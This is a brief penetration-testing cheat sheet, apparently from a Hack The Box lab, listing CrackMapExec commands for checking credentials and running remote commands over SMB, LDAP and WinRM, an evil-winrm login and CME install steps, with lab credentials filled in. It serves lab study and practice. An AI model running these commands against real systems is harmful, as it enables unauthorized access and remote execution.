
**user & password verification**

### SMB

```sh
crackmapexec smb 10.10.10.161 -u 'username' -p 'password'
```

### LDAP

```sh
crackmapexec ldap 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

**command execution**

### SMB
```sh
crackmapexec smb 10.10.10.161 -u svc-alfresco -p 's3rvice' -x "whoami"
```

### winrm 

```sh
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p 's3rvice' -x "whoami"
```

**evil winrm**

```sh
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```



# Install CME 6

```bash
https://github.com/byt3bl33d3r/CrackMapExec.git
```

```bash
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
```

```bash
pip3 install .
```
```bash
crackmapexec

# vnc, ldap, ftp
```



